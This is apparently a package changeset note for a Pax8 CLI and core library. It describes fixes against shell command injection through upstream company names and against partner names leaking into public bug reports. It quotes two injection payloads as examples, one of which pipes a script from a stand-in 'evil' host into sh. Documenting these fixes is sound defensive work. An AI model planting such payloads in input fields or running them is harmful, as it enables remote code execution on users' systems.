---
"@pax8/cli": patch
"@pax8/core": minor
---

Two hardening fixes against adversarial input from the partner-tenant API surface:

1. **`Recommendation.orderArgs` (new, `@pax8/core` minor bump).** `Recommendation.orderCommand` was a display string built by interpolating the upstream-controlled `companyName` into a shell template. A malicious customer name like `Acme" $(curl evil/x|sh) "` produced a working shell payload once a user or tool-using agent pasted it into `bash -c` or `eval`. New `orderArgs: string[] | null` field is the same content pre-tokenized as an argv-style array (first element is `"pax8"`); programmatic callers — REPL, `recommendations act`, the Claude skill — execute via this instead of evaluating the display string. `orderCommand` remains for display-only use and now prefers `companyId` when it's a UUID.

2. **Bug-report redactor catches upstream-resolved names.** When an error like `Company not found: "Acme Corp"` was sent to `pax8 report-bug`, `"Acme Corp"` was not in argv, so the existing argv-derived redaction missed it and the partner name shipped to the public GitHub issue body. `redactEnvelope` now harvests quoted substrings from `message` / `causes[]` / `recoverySteps[]` and treats them as additional `argTokens`. The regex spans from the first quote to the last quote on a line, so a hostile partner name with inner quotes (`Acme" $(echo PWNED) "`) gets scrubbed atomically.

Closes #473. Addresses #462.
